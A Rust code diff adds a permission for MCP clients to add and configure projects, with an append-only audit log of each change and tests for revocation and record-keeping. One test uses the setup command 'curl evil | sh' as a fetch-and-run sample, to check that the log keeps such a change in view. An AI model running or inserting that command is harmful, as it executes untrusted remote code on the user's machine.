@@ -17,7 +17,7 @@ pub use migrate::saved_setting;
 pub use rusqlite::types as rusqlite_value;
 use rusqlite::types::Value;
 use rusqlite::{Connection, OptionalExtension, Row, params, params_from_iter};
-use serde::Serialize;
+use serde::{Deserialize, Serialize};
 
 #[derive(Debug, thiserror::Error)]
 pub enum Error {
@@ -468,6 +468,28 @@ const MIGRATIONS: &[&str] = &[
         order by a.rowid desc limit 1)
     where pr_url is not null;
 "#,
+    // 25: Whether an MCP client may add projects and change their GitHub account and commands. Off
+    // unless the person turns it on, a client from before included. And what each one set or
+    // changed, before and after, written along with the change and never rewritten.
+    r#"
+    alter table mcp_client add column can_manage_projects integer not null default 0;
+    create table mcp_project_change (
+        seq integer primary key autoincrement,
+        client_id text not null references mcp_client (id),
+        client_name text not null,
+        project_id text not null references project (id),
+        project_name text not null,
+        project_path text not null,
+        github_repo text,
+        action text not null,
+        changes text not null,
+        at text not null
+    );
+    create trigger mcp_project_change_no_update before update on mcp_project_change
+    begin select raise(abort, 'what an mcp client changed is never rewritten'); end;
+    create trigger mcp_project_change_no_delete before delete on mcp_project_change
+    begin select raise(abort, 'what an mcp client changed is never deleted'); end;
+"#,
 ];
 
 /// Whether the card a query calls `card` can start as far as other cards go: it waits for none,
@@ -548,6 +570,9 @@ pub struct McpClient {
     /// May send work back and retry on the runs it started, and add a note to their cards while
     /// they wait, besides `can_run`. Off unless the person turns it on.
     pub can_steer: bool,
+    /// May add projects and change their GitHub account and setup and check commands, besides
+    /// `can_run`. Off unless the person turns it on.
+    pub can_manage_projects: bool,
     /// How many of its runs may be open at once, counting those that wait for the person.
     pub max_open_runs: i64,
     pub created_at: String,
@@ -581,7 +606,135 @@ pub struct NewMcpCall<'a> {
     pub duration_ms: i64,
 }
 
-const MCP_CLIENT_COLUMNS: &str = "id, name, token_prefix, can_run, can_steer, max_open_runs, created_at, last_seen_at, revoked_at";
+/// What an MCP client changes in a project. `None` leaves a value as it is, and `Some(None)` takes
+/// a command away. Nothing else about a project is a client's to change.
+#[derive(Debug, Clone, Default)]
+pub struct ClientProjectEdit {
+    pub github_account: Option<String>,
+    pub setup_command: Option<Option<String>>,
+    pub check_command: Option<Option<String>>,
+    /// Where the folder's `origin` points now, for a project brought back: not the client's to
+    /// choose, but written and recorded with it, so that neither shows the repo it had before.
+    pub github_repo: Option<Option<String>>,
+}
+
+/// What came of a client's write to a project.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ClientWrite {
+    Done,
+    /// The client may not add or configure projects: it never could, or the person took that away.
+    NotAllowed,
+    /// The project was added or removed in the meantime, so nothing was written.
+    ProjectChanged,
+}
+
+/// One value a client set or changed: the project's field, and what it held before and after.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct FieldChange {
+    pub field: String,
+    pub before: Option<String>,
+    pub after: Option<String>,
+}
+
+/// A project an MCP client added, brought back or configured. Never rewritten.
+#[derive(Debug, Clone, PartialEq, Serialize)]
+#[serde(rename_all = "camelCase")]
+pub struct McpProjectChange {
+    pub seq: i64,
+    pub client_id: String,
+    pub client_name: String,
+    pub project_id: String,
+    pub project_name: String,
+    /// The folder, as two can have the same name, and the GitHub repo its runs read and push to,
+    /// as they were then.
+    pub project_path: String,
+    pub github_repo: Option<String>,
+    /// `added`, `restored` or `configured`.
+    pub action: String,
+    pub changes: Vec<FieldChange>,
+    pub at: String,
+}
+
+/// Whether the client may add and configure projects now: not revoked, and let both start runs and
+/// do this. Read inside the write it allows, so taking it away takes effect at once.
+fn may_manage_projects(conn: &Connection, client_id: &str) -> rusqlite::Result<bool> {
+    conn.query_row(
+        "select exists (select 1 from mcp_client
+         where id = ?1 and revoked_at is null and can_run and can_manage_projects)",
+        [client_id],
+        |r| r.get(0),
+    )
+}
+
+/// What differs between what a project held and what it holds now, in the order the app shows it.
+/// With `kept_too`, also what it held and holds still.
+fn field_changes(
+    before: [Option<&str>; 3],
+    after: [Option<&str>; 3],
+    kept_too: bool,
+) -> Vec<FieldChange> {
+    ["githubAccount", "setupCommand", "checkCommand"]
+        .into_iter()
+        .zip(before.into_iter().zip(after))
+        .filter(|(_, (before, after))| before != after || (kept_too && before.is_some()))
+        .map(|(field, (before, after))| FieldChange {
+            field: field.to_owned(),
+            before: before.map(str::to_owned),
+            after: after.map(str::to_owned),
+        })
+        .collect()
+}
+
+fn add_project_change(
+    conn: &Connection,
+    client_id: &str,
+    project_id: &str,
+    action: &str,
+    changes: &[FieldChange],
+) -> Result<()> {
+    conn.execute(
+        "insert into mcp_project_change (client_id, client_name, project_id, project_name, project_path, github_repo, action, changes, at)
+         select m.id, m.name, p.id, p.name, p.path, p.github_repo, ?3, ?4, ?5 from mcp_client m, project p
+         where m.id = ?1 and p.id = ?2",
+        params![
+            client_id,
+            project_id,
+            action,
+            serde_json::to_string(changes).unwrap_or_default(),
+            now()
+        ],
+    )?;
+    Ok(())
+}
+
+fn insert_project(conn: &Connection, project: &Project) -> rusqlite::Result<()> {
+    conn.execute(
+        "insert into project (id, name, path, created_at, github_account, github_repo, check_command, allowed_domains, allowed_read, services, env, setup_command, default_workflow, sensitive_paths, allow_localhost, issue_label)
+         values (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13, ?14, ?15, ?16)",
+        params![
+            project.id,
+            project.name,
+            project.path,
+            project.created_at,
+            project.github_account,
+            project.github_repo,
+            project.check_command,
+            serde_json::to_string(&project.allowed_domains).unwrap_or_default(),
+            serde_json::to_string(&project.allowed_read).unwrap_or_default(),
+            serde_json::to_string(&project.services).unwrap_or_default(),
+            serde_json::to_string(&project.env).unwrap_or_default(),
+            project.setup_command,
+            project.default_workflow,
+            serde_json::to_string(&project.sensitive_paths).unwrap_or_default(),
+            project.allow_localhost,
+            project.issue_label,
+        ],
+    )?;
+    Ok(())
+}
+
+const MCP_CLIENT_COLUMNS: &str = "id, name, token_prefix, can_run, can_steer, max_open_runs, created_at, last_seen_at, revoked_at, can_manage_projects";
 
 fn mcp_client_from(r: &Row) -> rusqlite::Result<McpClient> {
     Ok(McpClient {
@@ -594,11 +747,13 @@ fn mcp_client_from(r: &Row) -> rusqlite::Result<McpClient> {
         created_at: r.get(6)?,
         last_seen_at: r.get(7)?,
         revoked_at: r.get(8)?,
+        can_manage_projects: r.get(9)?,
     })
 }
 
 /// The tools that start a run, which is how a client's runs are told from everyone else's.
-const MCP_STARTS_A_RUN: &str = "('start_run', 'start_task', 'propose_change')";
+/// add_project starts the map of a project it adds.
+const MCP_STARTS_A_RUN: &str = "('start_run', 'start_task', 'propose_change', 'add_project')";
 
 /// Whether the run `{run}` is the client `{client}`'s: it started it, or Keel started it for the
 /// client from a card, as the run itself keeps: see `add_run_for_card`. Never by what a card
@@ -1824,13 +1979,15 @@ impl Store {
         Ok(client)
     }
 
-    /// Taking the leave to run away hands back what the client put in Todo, at the same time.
+    /// Taking the leave to run away hands back what the client put in Todo, at the same time, and
+    /// takes the leave to add and configure projects with it, so that one can't come back on its
+    /// own.
     pub fn set_mcp_client_can_run(&self, id: &str, can_run: bool) -> Result<McpClient> {
         {
             let mut conn = self.lock();
             let tx = conn.transaction()?;
             tx.execute(
-                "update mcp_client set can_run = ?2 where id = ?1",
+                "update mcp_client set can_run = ?2, can_manage_projects = (can_manage_projects and ?2) where id = ?1",
                 rusqlite::params![id, can_run],
             )?;
             hand_back_cards_of_clients_that_may_not_run(&tx)?;
@@ -1845,6 +2002,152 @@ impl Store {
             rusqlite::params![id, can_steer],
         )?;
         self.mcp_client(id)
+    }
+
+    /// Only the person calls this, from the app. It stays off for a client that may only read.
+    pub fn set_mcp_client_can_manage_projects(
+        &self,
+        id: &str,
+        can_manage_projects: bool,
+    ) -> Result<McpClient> {
+        self.lock().execute(
+            "update mcp_client set can_manage_projects = (?2 and can_run) where id = ?1",
+            rusqlite::params![id, can_manage_projects],
+        )?;
+        self.mcp_client(id)
+    }
+
+    /// Adds a project a client asked for, and records what it set, all or nothing.
+    pub fn add_project_for_mcp_client(
+        &self,
+        client_id: &str,
+        project: &Project,
+    ) -> Result<ClientWrite> {
+        let mut conn = self.lock();
+        let tx = conn.transaction()?;
+        if !may_manage_projects(&tx, client_id)? {
+            return Ok(ClientWrite::NotAllowed);
+        }
+        let taken: bool = tx.query_row(
+            "select exists (select 1 from project where path = ?1)",
+            [&project.path],
+            |r| r.get(0),
+        )?;
+        if taken {
+            return Ok(ClientWrite::ProjectChanged);
+        }
+        insert_project(&tx, project)?;
+        let set = field_changes(
+            [None; 3],
+            [
+                project.github_account.as_deref(),
+                project.setup_command.as_deref(),
+                project.check_command.as_deref(),
+            ],
+            false,
+        );
+        add_project_change(&tx, client_id, &project.id, "added", &set)?;
+        tx.commit()?;
+        Ok(ClientWrite::Done)
+    }
+
+    /// Changes a project's GitHub account and commands for a client, and records each value before
+    /// and after, all or nothing. With `restore` it also brings a removed project back, so it never
+    /// comes back with its old commands, and what it comes back with is recorded even where it
+    /// stayed. Otherwise, setting what's already there records nothing.
+    pub fn edit_project_for_mcp_client(
+        &self,
+        client_id: &str,
+        project_id: &str,
+        edit: &ClientProjectEdit,
+        restore: bool,
+    ) -> Result<ClientWrite> {
+        let mut conn = self.lock();
+        let tx = conn.transaction()?;
+        if !may_manage_projects(&tx, client_id)? {
+            return Ok(ClientWrite::NotAllowed);
+        }
+        let held: Option<(Option<String>, Option<String>, Option<String>)> = tx
+            .query_row(
+                "select github_account, setup_command, check_command from project
+                 where id = ?1 and (removed_at is not null) = ?2",
+                params![project_id, restore],
+                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)),
+            )
+            .optional()?;
+        let Some((account, setup, check)) = held else {
+            return Ok(ClientWrite::ProjectChanged);
+        };
+        let new_account = edit.github_account.clone().or_else(|| account.clone());
+        let new_setup = edit.setup_command.clone().unwrap_or_else(|| setup.clone());
+        let new_check = edit.check_command.clone().unwrap_or_else(|| check.clone());
+        let changes = field_changes(
+            [account.as_deref(), setup.as_deref(), check.as_deref()],
+            [
+                new_account.as_deref(),
+                new_setup.as_deref(),
+                new_check.as_deref(),
+            ],
+            restore,
+        );
+        if changes.is_empty() && !restore {
+            return Ok(ClientWrite::Done);
+        }
+        tx.execute(
+            "update project set github_account = ?2, setup_command = ?3, check_command = ?4, removed_at = null where id = ?1",
+            params![project_id, new_account, new_setup, new_check],
+        )?;
+        if let Some(repo) = &edit.github_repo {
+            tx.execute(
+                "update project set github_repo = ?2 where id = ?1",
+                params![project_id, repo],
+            )?;
+        }
+        let action = if restore { "restored" } else { "configured" };
+        add_project_change(&tx, client_id, project_id, action, &changes)?;
+        tx.commit()?;
+        Ok(ClientWrite::Done)
+    }
+
+    /// Whether an MCP client added this project, rather than the person.
+    pub fn project_added_by_mcp_client(&self, project_id: &str) -> Result<bool> {
+        Ok(self.lock().query_row(
+            "select exists (select 1 from mcp_project_change where project_id = ?1 and action = 'added')",
+            [project_id],
+            |r| r.get(0),
+        )?)
+    }
+
+    /// The latest projects clients added or configured, newest first. Past `limit`, the last
+    /// change to each value of each project is there still, so that many changes to one value
+    /// can't push out of sight who set another.
+    pub fn mcp_project_changes(&self, limit: i64) -> Result<Vec<McpProjectChange>> {
+        let conn = self.lock();
+        let mut stmt = conn.prepare(
+            "select seq, client_id, client_name, project_id, project_name, action, changes, at, project_path, github_repo
+             from mcp_project_change
+             where seq in (select seq from mcp_project_change order by seq desc limit ?1)
+                or seq in (select max(c.seq) from mcp_project_change c,
+                             json_each(case when json_valid(c.changes) then c.changes else '[]' end) f
+                           group by c.project_id, json_extract(f.value, '$.field'))
+             order by seq desc",
+        )?;
+        let rows = stmt.query_map([limit], |r| {
+            let changes: String = r.get(6)?;
+            Ok(McpProjectChange {
+                seq: r.get(0)?,
+                client_id: r.get(1)?,
+                client_name: r.get(2)?,
+                project_id: r.get(3)?,
+                project_name: r.get(4)?,
+                project_path: r.get(8)?,
+                github_repo: r.get(9)?,
+                action: r.get(5)?,
+                changes: serde_json::from_str(&changes).unwrap_or_default(),
+                at: r.get(7)?,
+            })
+        })?;
+        Ok(rows.collect::<rusqlite::Result<_>>()?)
     }
 
     /// Kept between one and the ceiling, whatever the caller asks for.
@@ -1978,29 +2281,7 @@ impl Store {
     }
 
     pub fn add_project(&self, project: &Project) -> Result<()> {
-        self.lock().execute(
-            "insert into project (id, name, path, created_at, github_account, github_repo, check_command, allowed_domains, allowed_read, services, env, setup_command, default_workflow, sensitive_paths, allow_localhost, issue_label)
-             values (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13, ?14, ?15, ?16)",
-            params![
-                project.id,
-                project.name,
-                project.path,
-                project.created_at,
-                project.github_account,
-                project.github_repo,
-                project.check_command,
-                serde_json::to_string(&project.allowed_domains).unwrap_or_default(),
-                serde_json::to_string(&project.allowed_read).unwrap_or_default(),
-                serde_json::to_string(&project.services).unwrap_or_default(),
-                serde_json::to_string(&project.env).unwrap_or_default(),
-                project.setup_command,
-                project.default_workflow,
-                serde_json::to_string(&project.sensitive_paths).unwrap_or_default(),
-                project.allow_localhost,
-                project.issue_label,
-            ],
-        )?;
-        Ok(())
+        Ok(insert_project(&self.lock(), project)?)
     }
 
     /// The label whose issues Keel brings to the board, or none to stop watching.
@@ -3999,6 +4280,8 @@ mod tests {
             let conn = rusqlite::Connection::open(&path).unwrap();
             conn.execute_batch(
                 "pragma user_version = 4;
+                 drop table mcp_project_change;
+                 alter table mcp_client drop column can_manage_projects;
                  alter table run drop column pr_counted_at;
                  alter table run drop column pr_commits_added;
                  alter table run drop column pr_delivered;
@@ -4340,6 +4623,8 @@ mod tests {
             let conn = rusqlite::Connection::open(&path).unwrap();
             conn.execute_batch(
                 "pragma user_version = 15;
+                 drop table mcp_project_change;
+                 alter table mcp_client drop column can_manage_projects;
                  alter table run drop column pr_counted_at;
                  alter table run drop column pr_commits_added;
                  alter table run drop column pr_delivered;
@@ -4421,6 +4706,8 @@ mod tests {
             let conn = rusqlite::Connection::open(&path).unwrap();
             conn.execute_batch(
                 "pragma user_version = 22;
+                 drop table mcp_project_change;
+                 alter table mcp_client drop column can_manage_projects;
                  alter table run drop column pr_counted_at;
                  alter table run drop column pr_commits_added;
                  alter table run drop column pr_delivered;
@@ -4529,6 +4816,8 @@ mod tests {
             let conn = rusqlite::Connection::open(&path).unwrap();
             conn.execute_batch(
                 "pragma user_version = 20;
+                 drop table mcp_project_change;
+                 alter table mcp_client drop column can_manage_projects;
                  alter table run drop column pr_counted_at;
                  alter table run drop column pr_commits_added;
                  alter table run drop column pr_delivered;
@@ -4613,6 +4902,8 @@ mod tests {
             let conn = rusqlite::Connection::open(&path).unwrap();
             conn.execute_batch(
                 "pragma user_version = 21;
+                 drop table mcp_project_change;
+                 alter table mcp_client drop column can_manage_projects;
                  alter table run drop column pr_counted_at;
                  alter table run drop column pr_commits_added;
                  alter table run drop column pr_delivered;
@@ -4989,6 +5280,8 @@ mod tests {
             let conn = rusqlite::Connection::open(&path).unwrap();
             conn.execute_batch(
                 "pragma user_version = 23;
+                 drop table mcp_project_change;
+                 alter table mcp_client drop column can_manage_projects;
                  alter table run drop column pr_counted_at;
                  alter table run drop column pr_commits_added;
                  alter table run drop column pr_delivered;",
@@ -7064,6 +7357,8 @@ mod tests {
             let conn = rusqlite::Connection::open(&path).unwrap();
             conn.execute_batch(
                 "pragma user_version = 8;
+                 drop table mcp_project_change;
+                 alter table mcp_client drop column can_manage_projects;
                  alter table run drop column pr_counted_at;
                  alter table run drop column pr_commits_added;
                  alter table run drop column pr_delivered;
@@ -7255,6 +7550,178 @@ mod tests {
         let json = serde_json::to_value(store.mcp_client("c1").unwrap()).unwrap();
         assert_eq!(json["canSteer"], false);
         assert_eq!(json["maxOpenRuns"], 1);
+    }
+
+    #[test]
+    fn only_a_client_that_may_run_can_be_let_manage_projects_and_loses_it_with_that() {
+        let (_dir, store) = store();
+        let client = store
+            .add_mcp_client("c1", "Bot", &[7u8; 32], "keel_abc", false)
+            .unwrap();
+        assert!(
+            !client.can_manage_projects,
+            "off until the person turns it on"
+        );
+        let allow = |on| {
+            store
+                .set_mcp_client_can_manage_projects("c1", on)
+                .unwrap()
+                .can_manage_projects
+        };
+        assert!(!allow(true), "it only reads");
+        store.set_mcp_client_can_run("c1", true).unwrap();
+        assert!(!store.mcp_client("c1").unwrap().can_manage_projects);
+        assert!(allow(true));
+        assert!(!allow(false));
+        assert!(allow(true));
+
+        // Taking the leave to run away takes this with it, and giving it back doesn't return it.
+        assert!(
+            !store
+                .set_mcp_client_can_run("c1", false)
+                .unwrap()
+                .can_manage_projects
+        );
+        assert!(
+            !store
+                .set_mcp_client_can_run("c1", true)
+                .unwrap()
+                .can_manage_projects
+        );
+        let json = serde_json::to_value(store.mcp_client("c1").unwrap()).unwrap();
+        assert_eq!(json["canManageProjects"], false);
+    }
+
+    #[test]
+    fn a_client_from_before_managing_projects_does_not_get_it() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("keel.db");
+        let before = 24;
+        {
+            let conn = Connection::open(&path).unwrap();
+            for migration in &MIGRATIONS[..before] {
+                conn.execute_batch(migration).unwrap();
+            }
+            conn.pragma_update(None, "user_version", before as i64)
+                .unwrap();
+            conn.execute(
+                "insert into mcp_client (id, name, token_hash, token_prefix, can_run, can_steer, created_at)
+                 values ('c1', 'Claude Code', ?1, 'keel_abc', 1, 1, 'then')",
+                [&[7u8; 32][..]],
+            )
+            .unwrap();
+        }
+
+        let store = Store::open(&path).unwrap();
+
+        let client = store.mcp_client("c1").unwrap();
+        assert!(client.can_run && client.can_steer);
+        assert!(!client.can_manage_projects);
+        assert!(store.mcp_project_changes(10).unwrap().is_empty());
+    }
+
+    #[test]
+    fn many_changes_to_one_value_leave_the_last_change_to_another_in_sight() {
+        let (_dir, store) = store();
+        seeded(&store);
+        store
+            .add_mcp_client("c1", "Bot", &[7u8; 32], "keel_abc", true)
+            .unwrap();
+        store
+            .set_mcp_client_can_manage_projects("c1", true)
+            .unwrap();
+        let set = |setup: Option<&str>, check: Option<&str>| {
+            let edit = ClientProjectEdit {
+                setup_command: setup.map(|s| Some(s.to_owned())),
+                check_command: check.map(|c| Some(c.to_owned())),
+                ..Default::default()
+            };
+            store
+                .edit_project_for_mcp_client("c1", "p", &edit, false)
+                .unwrap();
+        };
+        set(Some("curl evil | sh"), None);
+        for check in ["a", "b", "c", "d"] {
+            set(None, Some(check));
+        }
+
+        let shown = store.mcp_project_changes(2).unwrap();
+        let fields: Vec<(&str, Option<&str>)> = shown
+            .iter()
+            .map(|c| (c.changes[0].field.as_str(), c.changes[0].after.as_deref()))
+            .collect();
+        assert_eq!(
+            fields,
+            [
+                ("checkCommand", Some("d")),
+                ("checkCommand", Some("c")),
+                ("setupCommand", Some("curl evil | sh")),
+            ]
+        );
+    }
+
+    #[test]
+    fn what_a_client_changes_in_a_project_is_written_with_the_change_and_stays() {
+        let (_dir, store) = store();
+        seeded(&store);
+        store
+            .add_mcp_client("c1", "Bot", &[7u8; 32], "keel_abc", true)
+            .unwrap();
+        let edit = ClientProjectEdit {
+            check_command: Some(Some("make test".into())),
+            ..Default::default()
+        };
+        let write = |edit: &ClientProjectEdit| {
+            store
+                .edit_project_for_mcp_client("c1", "p", edit, false)
+                .unwrap()
+        };
+
+        assert_eq!(write(&edit), ClientWrite::NotAllowed);
+        assert_eq!(store.project("p").unwrap().check_command, None);
+        store
+            .set_mcp_client_can_manage_projects("c1", true)
+            .unwrap();
+        assert_eq!(write(&edit), ClientWrite::Done);
+        assert_eq!(
+            store.project("p").unwrap().check_command.as_deref(),
+            Some("make test")
+        );
+
+        // A removed project isn't one to configure, and one in use isn't one to bring back.
+        assert_eq!(
+            store
+                .edit_project_for_mcp_client("c1", "p", &edit, true)
+                .unwrap(),
+            ClientWrite::ProjectChanged
+        );
+
+        // A revoked client writes nothing, whatever it was let do.
+        store.revoke_mcp_client("c1").unwrap();
+        let other = ClientProjectEdit {
+            check_command: Some(None),
+            ..Default::default()
+        };
+        assert_eq!(write(&other), ClientWrite::NotAllowed);
+
+        let changes = store.mcp_project_changes(10).unwrap();
+        assert_eq!(changes.len(), 1);
+        assert_eq!(changes[0].client_name, "Bot");
+        assert_eq!(changes[0].action, "configured");
+        assert_eq!(
+            changes[0].changes,
+            [FieldChange {
+                field: "checkCommand".into(),
+                before: None,
+                after: Some("make test".into()),
+            }]
+        );
+        let conn = store.lock();
+        assert!(
+            conn.execute("update mcp_project_change set changes = '[]'", [])
+                .is_err()
+        );
+        assert!(conn.execute("delete from mcp_project_change", []).is_err());
     }
 
     #[test]
@@ -7911,6 +8378,8 @@ mod tests {
         let conn = Connection::open(&path).unwrap();
         conn.execute_batch(
             "pragma user_version = 16;
+             drop table mcp_project_change;
+             alter table mcp_client drop column can_manage_projects;
              alter table run drop column pr_counted_at;
              alter table run drop column pr_commits_added;
              alter table run drop column pr_delivered;
